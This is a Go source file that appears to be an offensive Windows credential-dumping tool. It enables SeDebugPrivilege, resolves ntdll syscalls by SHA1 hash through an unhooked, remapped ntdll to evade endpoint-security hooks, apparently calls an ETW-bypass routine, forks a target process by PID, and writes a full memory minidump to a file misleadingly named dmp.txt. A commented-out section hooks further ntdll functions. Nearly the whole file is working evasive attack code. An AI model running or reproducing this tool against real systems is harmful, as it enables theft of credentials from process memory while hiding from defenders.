package main

import (
	"crypto/sha1"
	"fmt"
	"github.com/castaneai/hinako"
	"golang.org/x/sys/windows"
	"log"
	"os"
	"strconv"
	"syscall"
	"unsafe"

	wins "github.com/cloudfoundry/gosigar/sys/windows"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
)

const MiniDumpWithFullMemory = 0x00000002

var(
	arch *hinako.ArchAMD64
	err error
	ReMapNtdll,_ = gabh.ReMapNtdll()
)

func ZwOpenP(ZwOpenProcess uintptr,pid uintptr)(uintptr,uintptr,uintptr,error){
	type objectAttrs struct {
		Length                   uintptr
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uintptr
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}

	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}

	var pHndl uintptr
	r1,r2,lastErr := syscall.Syscall6(ZwOpenProcess,4,
		uintptr(unsafe.Pointer(&pHndl)),
		windows.PROCESS_CREATE_PROCESS,//0x1fffff,				//ProcessAllAccess = 0x1fffff
		uintptr(unsafe.Pointer(&objectAttrs{0, 0, 0, 0, 0, 0})),
		uintptr(unsafe.Pointer(&clientID{uintptr(pid), 0})),
		0,
		0,
	)
	return pHndl,r1,r2,lastErr
}


func enableSeDebugPrivilege() error {
	self, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}

	var token syscall.Token
	err = syscall.OpenProcessToken(self, syscall.TOKEN_QUERY|syscall.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		return err
	}

	if err = wins.EnableTokenPrivileges(token, wins.SeDebugPrivilege); err != nil {
		return err
	}

	return nil
}



func main(){

	pid,_ := strconv.Atoi(os.Args[1])

	e := enableSeDebugPrivilege()
	if e != nil{
		fmt.Printf("SeDebugPrivilege failed: %v\n", e)
		return
	}
	ByETW()



	//===============================================
	//
	//		Hook API
	//
	//===============================================


	NtQuerySystemInformation,_,e := ReMapNtdll.GetFuncUnhook("ff06d2a62a1b4f33ab91d501ad53158cf899f780",str2sha1)
	if e != nil{
		panic(e)
	}


	// API Hooking by hinako
	//var original *syscall.Proc
	var hook2  *hinako.Hook
	hook2, err = hinako.NewHookByName(arch, "ntdll.dll", "NtQuerySystemInformation", func(n1,n2,n3,n4 uintptr) uintptr {
		fmt.Println("---------------------------------------------------")
		fmt.Println("NtQuerySystemInformation hooked !!!!!")

		windows.SleepEx(1,false)


		r, _, _ := syscall.Syscall6(uintptr(NtQuerySystemInformation), 4, n1,n2,n3,n4,0,0)
		//r, _, _ := syscall.Syscall6(original.Addr(), 5, n1,n2,n3,n4,n5,0)

		fmt.Println("---------------------------------------------------")
		fmt.Println("")

		return uintptr(r)
	})
	if err != nil {
		log.Fatalf("failed to hook NtQuerySystemInformation: %+v", err)
	}
	defer hook2.Close()
	//original = hook1.OriginalProc
	// After hook

/*

	NtQueryInformationThread, e := gabh.DiskHgate("777e1962aa30c83ccb29874bb58c03b76f81e346",str2sha1)
	//NtQueryInformationThread,_,e := ReMapNtdll.GetFuncUnhook("777e1962aa30c83ccb29874bb58c03b76f81e346",str2sha1)
	if e != nil{
		panic(e)
	}


	// API Hooking by hinako
	//var original *syscall.Proc
	var hook3  *hinako.Hook
	hook3, err = hinako.NewHookByName(arch, "ntdll.dll", "NtQueryInformationThread", func(n1,n2,n3,n4,n5 uintptr) uintptr {
		fmt.Println("---------------------------------------------------")
		fmt.Println("NtQueryInformationThread hooked !!!!!")

		windows.SleepEx(1,false)


		r,_ := gabh.HgSyscall(NtQueryInformationThread,n1,n2,n3,n4,n5)
		//r, _, _ := syscall.Syscall6(uintptr(NtQueryInformationThread), 5, n1,n2,n3,n4,n5,0)
		//r, _, _ := syscall.Syscall6(original.Addr(), 5, n1,n2,n3,n4,n5,0)

		fmt.Println("---------------------------------------------------")
		fmt.Println("")

		return uintptr(r)
	})
	if err != nil {
		log.Fatalf("failed to hook NtQueryInformationThread: %+v", err)
	}
	defer hook3.Close()
	//original = hook1.OriginalProc
	// After hook





	NtProtectVirtualMemory, e := gabh.DiskHgate("059637f5757d91ad1bc91215f73ab6037db6fe59",str2sha1)
	//NtProtectVirtualMemory,_,e := ReMapNtdll.GetFuncUnhook("059637f5757d91ad1bc91215f73ab6037db6fe59",str2sha1)
	if e != nil{
		panic(e)
	}

	// API Hooking by hinako
	//var original *syscall.Proc
	var hook4  *hinako.Hook
	hook4, err = hinako.NewHookByName(arch, "ntdll.dll", "NtProtectVirtualMemory", func(n1,n2,n3,n4,n5 uintptr) uintptr {
		fmt.Println("---------------------------------------------------")
		fmt.Println("NtProtectVirtualMemory hooked !!!!!")

		windows.SleepEx(1,false)


		r,_ := gabh.HgSyscall(NtProtectVirtualMemory,n1,n2,n3,n4,n5)
		//r, _, _ := syscall.Syscall6(uintptr(NtProtectVirtualMemory), 5, n1,n2,n3,n4,n5,0)
		//r, _, _ := syscall.Syscall6(original.Addr(), 5, n1,n2,n3,n4,n5,0)

		fmt.Println("---------------------------------------------------")
		fmt.Println("")

		return uintptr(r)
	})
	if err != nil {
		log.Fatalf("failed to hook NtProtectVirtualMemory: %+v", err)
	}
	defer hook4.Close()
	//original = hook1.OriginalProc
	// After hook


	NtReadVirtualMemory, e := gabh.DiskHgate("ee680bb3dc4f47d1e3a14538f25a98899974d0dc",str2sha1)
	//NtReadVirtualMemory,_,e := ReMapNtdll.GetFuncUnhook("ee680bb3dc4f47d1e3a14538f25a98899974d0dc",str2sha1)
	if e != nil{
		panic(e)
	}

	flag := 0
	// API Hooking by hinako
	arch = &hinako.ArchAMD64{}
	//var original *syscall.Proc
	var hook1  *hinako.Hook
	hook1, err = hinako.NewHookByName(arch, "ntdll.dll", "NtReadVirtualMemory", func(n1,n2,n3,n4,n5 uintptr) uintptr {
		fmt.Println("---------------------------------------------------")
		fmt.Println("NtReadVirtualMemory hooked"+ strconv.Itoa(flag)+"!!!!!")

		
		windows.LoadLibrary("fuck.dll")
		//windows.SleepEx(1,false)

		r,_ := gabh.HgSyscall(NtReadVirtualMemory,n1,n2,n3,n4,n5)
		//r, _, _ := syscall.Syscall6(uintptr(NtReadVirtualMemory), 5, n1,n2,n3,n4,n5,0)
		//r, _, _ := syscall.Syscall6(original.Addr(), 5, n1,n2,n3,n4,n5,0)

		fmt.Println("---------------------------------------------------")
		fmt.Println("")
		flag = flag +1

		return uintptr(r)
	})
	if err != nil {
		log.Fatalf("failed to hook NtReadVirtualMemory: %+v", err)
	}
	defer hook1.Close()
	//original = hook1.OriginalProc
	// After hook

 */

	//===============================================
	//
	//		Hook End
	//
	//===============================================




	//Read and Fork

	var hProcess uintptr
	ZwOpenProcess,_,e := ReMapNtdll.GetFuncUnhook("4722e0577c85ecb9c134ffbb2ce080fee0ba5d64",str2sha1)
	if e != nil{
		panic(e)
	}

	ZwClose,_,e := ReMapNtdll.GetFuncUnhook("27dffd1dd7df9bcfcdcf0513700515a7f6eeb766",str2sha1)
	if e != nil{
		panic(e)
	}

	hProcess,_,_,_ = ZwOpenP(uintptr(ZwOpenProcess), uintptr(pid))

	NtCreateProcessEx,_,e := ReMapNtdll.GetFuncUnhook("df1a83db80c83f59a3b2c0337d704fe579401473",str2sha1)
	if e != nil{
		panic(e)
	}

	var currentSnapshotProcess uintptr

	//syscall.Syscall9(uintptr(NtCreateProcessEx),9,uintptr(unsafe.Pointer(&currentSnapshotProcess)),0x1fffff,0,hProcess,0,0,0,0,0)
	syscall.Syscall9(uintptr(NtCreateProcessEx),9,uintptr(unsafe.Pointer(&currentSnapshotProcess)),windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_READ,0,hProcess,0,0,0,0,0)

	//Read and Fork End


	pwd,_ := os.Getwd()

	str := "\\??\\"+pwd+"\\dmp.txt"

	chDmpFile,_ := windows.NewNTUnicodeString(str)

	var hDmpFile uintptr

	objectAttributes := windows.OBJECT_ATTRIBUTES{}
	objectAttributes.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
	objectAttributes.ObjectName = chDmpFile

	var ioStatusBlock windows.IO_STATUS_BLOCK

	NtCreateFile_ptr,_,e := ReMapNtdll.GetFuncUnhook("9ff6fa2b8fb83ea0432045d6766ca0e3ae7038aa",str2sha1)
	if e != nil{
		panic(e)
	}

	syscall.Syscall12(uintptr(NtCreateFile_ptr),11,uintptr(unsafe.Pointer(&hDmpFile)),syscall.GENERIC_WRITE|syscall.SYNCHRONIZE,uintptr(unsafe.Pointer(&objectAttributes)),uintptr(unsafe.Pointer(&ioStatusBlock)),0,0,syscall.FILE_SHARE_WRITE,windows.FILE_OVERWRITE_IF,windows.FILE_SYNCHRONOUS_IO_NONALERT,0,0,0)

	if hDmpFile == uintptr(windows.InvalidHandle) || hDmpFile == 0{
		fmt.Println("NtCreateFile Err")
		os.Exit(2)
	}

	MiniDumpWriteDump,_,e := gabh.GetFuncPtr("dbgcore.dll","6fd11841d7f7c5514490f6079ab1c51c3162c477",str2sha1)

	if e != nil{
		panic(e)
	}

	Success,_,_ := syscall.Syscall9(uintptr(MiniDumpWriteDump),7,currentSnapshotProcess,uintptr(pid),hDmpFile,MiniDumpWithFullMemory,0,0,0,0,0)

	if Success == 0{
		fmt.Println("Failed")
		os.Exit(2)
	}
	fmt.Println("Dump Succeed")

	syscall.Syscall(uintptr(ZwClose),1,hDmpFile,0,0)
	syscall.Syscall(uintptr(ZwClose),1,currentSnapshotProcess,0,0)
	syscall.Syscall(uintptr(ZwClose),1,hProcess,0,0)

}


func str2sha1(s string) string{
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}
